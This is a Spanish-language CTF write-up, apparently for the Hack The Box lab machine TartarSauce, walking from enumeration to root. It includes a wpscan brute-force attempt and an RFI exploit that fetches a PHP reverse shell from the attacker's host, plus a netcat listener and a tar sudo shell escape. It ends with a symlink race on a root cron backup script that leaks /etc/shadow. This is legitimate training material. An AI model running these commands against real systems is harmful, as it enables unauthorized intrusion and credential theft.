# Tartarsauce

![](../../../../~gitbook/image.md)Publicado: 17 de Mayo de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Medium
### 📝 Descripción
TartarSauce es una máquina Linux de dificultad media que presenta múltiples vectores de ataque a través de aplicaciones web. El objetivo es explotar vulnerabilidades en varios servicios web para obtener acceso inicial y luego escalar privilegios mediante una tarea cron que ejecuta un script de backup inseguro. La máquina simula un entorno realista donde el atacante debe encadenar varias técnicas para lograr comprometer completamente el sistema, desde la enumeración de directorios hasta la explotación de un plugin vulnerable de WordPress y finalmente manipular un script de backup con privilegios elevados para obtener acceso como root.La máquina contiene un servidor web Apache que aloja múltiples aplicaciones, incluyendo un WordPress y un CMS Monstra, cada uno con sus propias vulnerabilidades. La parte más interesante está en la escalada de privilegios, que requiere una comprensión profunda del funcionamiento de un script de backup personalizado y la capacidad de aprovechar una ventana de tiempo específica para manipular archivos y obtener información sensible.Esta máquina es excelente para practicar:- Enumeración web exhaustiva
- Explotación de plugins de WordPress (RFI)
- Técnicas de escalada de privilegios con tareas cron
- Race conditions y manipulación de archivos temporales

### 🔭 Reconocimiento

#### Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
#### Escaneo de puertos

#### Enumeración de servicios

### 🌐 Enumeración Web

#### 80 HTTP
http://10.10.10.88/![](../../../../~gitbook/image.md)A través del fichero robots.txt logamos enumerar algunos recursos de forma manual:http://10.10.10.88/robots.txt🕷️Fuzzing de directoriosVeamos qué logramos enumerar realizando fuzzing de directorios de manera automatizada con herramientas feroxbuster y dirsearch:![](../../../../~gitbook/image.md)Encontramos varias rutas interesantes:http://10.10.10.88/webservices/monstra-3.0.4/admin/![](../../../../~gitbook/image.md)Enumeramos un panel de login que parece tener detrás un CMS llamado Monstra en la versión 3.0.4. Esta versión parece vulnerable a RCE:![](../../../../~gitbook/image.md)Probamos con las credenciales básicas `admin:admin` y logramos acceder. Tenemos las credenciales, estamos en disposición de usar el exploit anterior para explotar un RCE de la siguiente forma:Básicamente consiste en crear un archivo con extensión .php7 con el siguiente contenido y subirlo a través del módulo de subida de archivos![](../../../../~gitbook/image.md)Tras probar con diversas extensiones siempre obtenemos el mismo error:![](../../../../~gitbook/image.md)Por lo que parece que es un punto muerto o rabbit hole y debemos seguir buscando otro vector de ataque:http://10.10.10.88/webservices/wp/![](../../../../~gitbook/image.md)Observamos que no está cargando correctamente el contenido (probablemente porque se esté aplicando vhosting) así que revisamos el código fuente:![](../../../../~gitbook/image.md)Añadimos el vhost tartarsauce.htb a nuestro fichero /etc/hosts y recargamos la página![](../../../../~gitbook/image.md)Enumerando manualmente observamos en el código fuente que el wordpress está usando un tema llamado voce.![](../../../../~gitbook/image.md)Y la versión de wordpress es la 4.9.4![](../../../../~gitbook/image.md)También descubrimos accediendo a la ruta:
http://tartarsauce.htb/webservices/wp/index.php/wp-json/wp/v2/users/ un usuario llamado wpadmin:![](../../../../~gitbook/image.md)Automatizamos esto es un poco usando la herramienta wp-scan y confirmamos la información anterior:Parece que no está logrando enumerar plugins, usando la flag "para intentar realizar un escaneo más agresivo:Vemos además que este wordpress tiene habilitado xmlrpc, lo cual nos permite realizar ataques de fuerza bruta contra el panel de login.También hemos logrado enumerar un usuario wp-admin que confirmamos que existe al intentar usarlo el panel de login:
http://tartarsauce.htb/webservices/wp/wp-login.php![](../../../../~gitbook/image.md)Al estar habilitado xmlrpc, intentamos un ataque de fuerza bruta aunque no tenemos éxito:Verificamos si alguno de los plugins enumerados anteriormente es vulnerable y encontramos que la versión 1.5.3 de gwolle-gb sí lo es:![](../../../../~gitbook/image.md)
### 💻 Explotación

#### CVE-2015-8351
Para llevar a cabo la explotación usaremos el siguiente exploit:https://github.com/G4sp4rCS/exploit-CVE-2015-8351Descargamos el exploit y le damos permisos de ejecuciónCopiamos una php shell de pentestmonkey que usaremos para explotar el RFI:Establecemos el puerto y la ip de nuestro host atacante en la php reverse shell.Disponibilizamos la php reverse shell en nuestro host de ataque mediante un servidor web en python:A continuación iniciamos un listener en el puerto especificado en nuestro host de ataque:Lanzamos el exploitObservamos que nos falla porque espera que el nombre del archivo .php se llame wp-load.php así que renombramos nuestra reverse shell para que tenga ese mismo nombre y relanzamos el exploit![](../../../../~gitbook/image.md)
#### Foothold
Ganamos acceso a la máquina:
#### Mejora de la shell
Enumeramos un directorio usuario llamado onuma aunque no tenemos permisos para ver su contenido.Verificamos si el usuario www-data puede ejecutar algún comando como sudo:Vemos que aunque no puede ejecutar ningún comando como super usuario, sí que puede ejecutar uno como usuario onuma sin que tenga que especificar la contraseña:https://gtfobins.github.io/gtfobins/tar/#sudoEscalamos a usuario onuma usando el siguiente comando:Una vez que ya somos onuma podemos leer la primera flag:
#### 👑 Escalada de privilegios
Enumeramos la máquina para ver si podemos encontrar algo que nos permita movernos lateralmente y/o escalar privilegios. Sabemos que hay una aplicación wordpress instalada, por lo que revisamos el directorio `/var/www/html/webservices/wp`y encontramos credenciales en el fichero wp-config.phpParece otro callejón sin salida ya que esta contraseña no nos sirve para conectarnos a la base de datos ni tampoco para usarla como usuario root.Continuamos enumerando y encontramos algo interesante en el directorio /var/backups![](../../../../~gitbook/image.md)Parece que hay una herramienta que el usuario onuma está usando llamado backuperer.Buscamos referencias a este archivo![](../../../../~gitbook/image.md)Revisamos el contenido de este scriptA continuación repasaremos las partes más importantes del script- Ejecutar `/bin/tar`como `onuma`y hacer una copia de seguridad `$basedir`en un archivo tar comprimido con gzip llamado`$tmpfile`
- `$basedir`y `$tmpfile`se definen en las variables en la parte superior del script
- `$basedir`se define como`/var/www/html`
- `$tmpfile`es un nombre aleatorio, por lo que`/var/tmp/.{randomized_chars}`
- Luego, pausamos arbitrariamente la ejecución del script durante 30 segundos.
- Define una función llamada `integrity_chk`que mira recursivamente `$basedir`: `/var/www/html`y `$check$basedir`:`/var/tmp/check/var/www/html`
- Crear el directorio `$check`:`/var/tmp/check`
- Extracto `$tmpfile`: `/var/tmp/.{randomized_chars}`a `$check`:`/var/tmp/check`
- Entonces, `if [[ $(integrity_chk) ]]`si se `diff -r $basedir $check$basedir`devuelve algún resultado, los archivos en `$basedir`y en no `$checkbasedir`son los mismos . El resultado del `diff`comando se registrará en `$errormsg`:`/var/backups/onuma_backup_error.txt`
Podemos ver que el script se ejecuta en intervalos de cinco minutos inspeccionando `/var/backups/onuma_backup_test.txt`y observando la marca de tiempo de la última ejecución.Estoy casi seguro de que este script se ejecuta a través del `root`crontab del usuario, ya que el trabajo cron no está en el crontab de onuma ni en ningún `/etc/cron`archivo legible.Mi plan para abusar del script es:- Monitorizar la creación de `$tmpfile`:`/var/tmp/.{randomized_chars}`
- Una vez creado este archivo, tenemos 30 segundos para crear una condición que `integrity_chk()`produzca algún resultado.
- Una vez `$tmpfile`creado, se vincula simbólicamente `/root/root.txt`y `/etc/shadow`en `/var/www/html`como `www-data`usuario
Como dijo Jack el destripador, vayamos por partes:- Hasta que el`find`comando encuentre un nombre de archivo que comience con`.`en`/var/tmp`suspensión durante 3 segundos en un bucle continuo
- Una vez hecho esto, se ejecutará la siguiente serie de comandos.
- Realiza una copia de seguridad del original `index.html`y `robots.txt`los archivos en el `/tmp`directorio
- Crea un enlace simbólico de `/etc/shadow`a`/var/www/html/index.html`
- Crea un enlace simbólico de `/root/root.txt`a`/var/www/html/robots.txt`
- Luego, una vez `integrity_chk()`comparado `/var/www/html`con `/var/tmp/check/var/www/html`, los `index.html`y los `robots.txt`en `/var/tmp/check`serán diferentes de los de `/var/www/html`y las líneas diferenciales se escribirán en el registro de errores.
- Esta última parte es solo una pequeña limpieza. Hasta que el `/usr/sbin/backuperer`proceso finalice, suspenda el sistema repetidamente durante 3 segundos.
- Luego, se encarga de borrar los enlaces simbólicos y retaurar los archivos originales desde`/tmp`
- Finalmente, muestra el contenido del archivo de error.
![](../../../../~gitbook/image.md)Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)
- [💻 Explotación](#explotacion)

```
❯  ping -c2 10.10.10.88
PING 10.10.10.88 (10.10.10.88) 56(84) bytes of data.
64 bytes from 10.10.10.88: icmp_seq=1 ttl=63 time=150 ms
64 bytes from 10.10.10.88: icmp_seq=2 ttl=63 time=150 ms

--- 10.10.10.88 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1006ms
rtt min/avg/max/mdev = 149.835/149.853/149.872/0.018 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.88 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
80
```

```
nmap -sC -sV -p$ports 10.10.10.88 -oN services.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-12 11:54 CEST
Nmap scan report for 10.10.11.28
Host is up (0.048s latency).

PORT     STATE SERVICE VERSION
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Landing Page
| http-robots.txt: 5 disallowed entries
| /webservices/tar/tar/source/
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-server-header: Apache/2.4.18 (Ubuntu)

```

```
User-agent: *
Disallow: /webservices/tar/tar/source/
Disallow: /webservices/monstra-3.0.4/
Disallow: /webservices/easy-file-uploader/
Disallow: /webservices/developmental/
Disallow: /webservices/phpmyadmin/
```

```
feroxbuster -u http://10.10.10.88 -r  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --scan-dir-listings -C 404 -x php,xml
```

```
searchsploit -m php/webapps/43348.txt
```

```

```

```
echo "10.10.10.88 tartarsauce.htb" | sudo tee -a /etc/hosts
```

```
wpscan --url http://tartarsauce.htb/webservices/wp/ -e ap
```

```
Interesting Finding(s):

[+] Headers
| Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
| Found By: Headers (Passive Detection)
| Confidence: 100%

[+] XML-RPC seems to be enabled: http://tartarsauce.htb/webservices/wp/xmlrpc.php
| Found By: Link Tag (Passive Detection)
| Confidence: 100%
| Confirmed By: Direct Access (Aggressive Detection), 100% confidence
| References:
|  - http://codex.wordpress.org/XML-RPC_Pingback_API
|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
|  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://tartarsauce.htb/webservices/wp/readme.html
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://tartarsauce.htb/webservices/wp/wp-cron.php
| Found By: Direct Access (Aggressive Detection)
| Confidence: 60%
| References:
|  - https://www.iplocation.net/defend-wordpress-from-ddos
|  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06).
| Found By: Rss Generator (Passive Detection)
|  - http://tartarsauce.htb/webservices/wp/index.php/feed/, https://wordpress.org/?v=4.9.4
|  - http://tartarsauce.htb/webservices/wp/index.php/comments/feed/, https://wordpress.org/?v=4.9.4

[+] WordPress theme in use: voce
| Location: http://tartarsauce.htb/webservices/wp/wp-content/themes/voce/
| Latest Version: 1.1.0 (up to date)
| Last Updated: 2017-09-01T00:00:00.000Z
| Readme: http://tartarsauce.htb/webservices/wp/wp-content/themes/voce/readme.txt
| Style URL: http://tartarsauce.htb/webservices/wp/wp-content/themes/voce/style.css?ver=4.9.4
| Style Name: voce
| Style URI: http://limbenjamin.com/pages/voce-wp.html
| Description: voce is a minimal theme, suitable for text heavy articles. The front page features a list of recent ...
| Author: Benjamin Lim
| Author URI: https://limbenjamin.com
|
| Found By: Css Style In Homepage (Passive Detection)
|
| Version: 1.1.0 (80% confidence)
| Found By: Style (Passive Detection)
|  - http://tartarsauce.htb/webservices/wp/wp-content/themes/voce/style.css?ver=4.9.4, Match: 'Version: 1.1.0'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
Checking Known Locations - Time: 00:00:06  (652 / 652) 100.00% Time: 00:00:06
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
Checking Known Locations - Time: 00:00:25  (2575 / 2575) 100.00% Time: 00:00:25

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
Checking Config Backups - Time: 00:00:01  (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
Checking DB Exports - Time: 00:00:00  (75 / 75) 100.00% Time: 00:00:00

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
Brute Forcing Attachment IDs - Time: 00:00:01  (100 / 100) 100.00% Time: 00:00:01

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
Brute Forcing Author IDs - Time: 00:00:00  (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] wpadmin
| Found By: Rss Generator (Passive Detection)
| Confirmed By:
|  Wp Json Api (Aggressive Detection)
|   - http://tartarsauce.htb/webservices/wp/index.php/wp-json/wp/v2/users/?per_page=100&page=1
|  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
|  Login Error Messages (Aggressive Detection)
```

```
wpscan --url http://10.10.10.88:80/webservices/wp -e ap --plugins-detection aggressive
```

```
wpscan --url http://tartarsauce.htb/webservices/wp -P /usr/share/wordlists/rockyou.txt -U "wpadmin"
```

```
+] Enumerating All Plugins (via Aggressive Methods)
Checking Known Locations - Time: 00:18:31  (109775 / 109775) 100.00% Time: 00:18:31
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
| Location: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/
| Last Updated: 2025-02-14T18:49:00.000Z
| Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
| [!] The version is out of date, the latest version is 5.3.7
|
| Found By: Known Locations (Aggressive Detection)
|  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/, status: 200
|
| Version: 4.0.3 (100% confidence)
| Found By: Readme - Stable Tag (Aggressive Detection)
|  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
| Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
|  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt

[+] brute-force-login-protection
| Location: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/
| Latest Version: 1.5.3 (up to date)
| Last Updated: 2017-06-29T10:39:00.000Z
| Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt
|
| Found By: Known Locations (Aggressive Detection)
|  - http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/, status: 403
|
| Version: 1.5.3 (80% confidence)
| Found By: Readme - Stable Tag (Aggressive Detection)
|  - http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt

[+] gwolle-gb
| Location: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/
| Last Updated: 2025-03-26T17:07:00.000Z
| Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
| [!] The version is out of date, the latest version is 4.8.1
|
| Found By: Known Locations (Aggressive Detection)
|  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/, status: 200
|
| Version: 2.3.10 (100% confidence)
| Found By: Readme - Stable Tag (Aggressive Detection)
|  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
| Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
|  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
```

```
wpscan --url http://tartarsauce.htb/webservices/wp/ -P /usr/share/wordlists/rockyou.txt -U "wpadmin"
```

```
git clone https://github.com/G4sp4rCS/exploit-CVE-2015-8351
cd exploit-CVE-2015-8351
chmod +x exploit.py
```

```
cp /usr/share/webshells/php/php-reverse-shell.php .
```

```
python3 -m http.server 80
```

```
nc -nlvp 1234
```

```
python3 exploit.py http://10.10.10.88/webservices/wp 10.10.14.8 1234
Error al enviar el exploit. Código de estado: 500
```

```
mv shell.php wp-load.php
```

```
www-data@TartarSauce:/home$ cd onuma
bash: cd: onuma: Permission denied
www-data@TartarSauce:/home$ ls -la
total 12
drwxr-xr-x  3 root  root  4096 May 12  2022 .
drwxr-xr-x 22 root  root  4096 May 12  2022 ..
drwxrw----  5 onuma onuma 4096 May 12  2022 onuma
```

```
script /dev/null -c bash

CTRL + Z

stty raw echo; fg
reset xterm

export TERM=xterm
```

```
www-data@TartarSauce:/var$ sudo -l
Matching Defaults entries for www-data on TartarSauce:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on TartarSauce:
(onuma) NOPASSWD: /bin/tar
www-data@TartarSauce:/var$
```

```
sudo -u onuma /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

```
onuma@TartarSauce:/var/backups$ cd /home
onuma@TartarSauce:/home$ ls
onuma
onuma@TartarSauce:/home$ cd onuma
onuma@TartarSauce:~$ cat user.txt
```

```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wp');

/** MySQL database username */
define('DB_USER', 'wpuser');

/** MySQL database password */
define('DB_PASSWORD', 'w0rdpr3$$d@t@b@$3@cc3$$');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
```

```
which backuperer

onuma@TartarSauce:/var/backups$ which backuperer
/usr/sbin/backuperer

```

```
grep -ilr backuperer / 2>/dev/null
```

```
onuma@TartarSauce:/var/backups$ cat /usr/sbin/backuperer

# !/bin/bash

# -------------------------------------------------------------------------------------
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
# ONUMA Dev auto backup program
# This tool will keep our webapp backed up incase another skiddie defaces us again.
# We will be able to quickly restore from a backup in seconds ;P
# -------------------------------------------------------------------------------------

# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check

# formatting
printbdr()
{
for n in $(seq 72);
do /usr/bin/printf $"-";
done
}
bdr=$(printbdr)

# Added a test file to let us see when the last backup was run
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg

# Cleanup from last time.
/bin/rm -rf $tmpdir/.* $check

# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &

# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30

# Test the backup integrity
integrity_chk()
{
/usr/bin/diff -r $basedir $check$basedir
}

/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]
then
# Report errors so the dev can investigate the issue.
/usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
integrity_chk >> $errormsg
exit 2
else
# Clean up and save archive to the bkpdir.
/bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
/bin/rm -rf $check .*
exit 0
fi
```

```
# Test the backup integrity
integrity_chk()
{
/usr/bin/diff -r $basedir $check$basedir
}
```

```
/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]
then
# Report errors so the dev can investigate the issue.
/usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
integrity_chk >> $errormsg
exit 2
else
# Clean up and save archive to the bkpdir.
/bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
/bin/rm -rf $check .*
exit 0
fi
```

```
until [[ $(find /var/tmp/ -maxdepth 1 -type f -name '.*') ]] ; do sleep 3 ; done ; mv /var/www/html/index.html /tmp/index.html ; mv /var/www/html/robots.txt /tmp/robots.txt ; ln -s /etc/shadow /var/www/html/index.html ; ln -s /root/root.txt /var/www/html/robots.txt ; until [[ ! $(ps aux | grep backuperer | grep -v grep) ]] ; do sleep 3 ; done ; unlink /var/www/html/index.html ; unlink /var/www/html/robots.txt ; mv /tmp/index.html /var/www/html/index.html ; mv /tmp/robots.txt /var/www/html/robots.txt ; cat /var/backups/onuma_backup_error.txt
```

```
until [[ $(find /var/tmp/ -maxdepth 1 -type f -name '.*') ]] ; do sleep 3 ; done ;
```

```
mv /var/www/html/index.html /tmp/index.html ;
mv /var/www/html/robots.txt /tmp/robots.txt ;
ln -s /etc/shadow /var/www/html/index.html ;
ln -s /root/root.txt /var/www/html/robots.txt ;
```

```
until [[ ! $(ps aux | grep backuperer | grep -v grep) ]] ; do sleep 3 ; done ; unlink /var/www/html/index.html ; unlink /var/www/html/robots.txt ; mv /tmp/index.html /var/www/html/index.html ; mv /tmp/robots.txt /var/www/html/robots.txt ; cat /var/backups/onuma_backup_error.txt
```
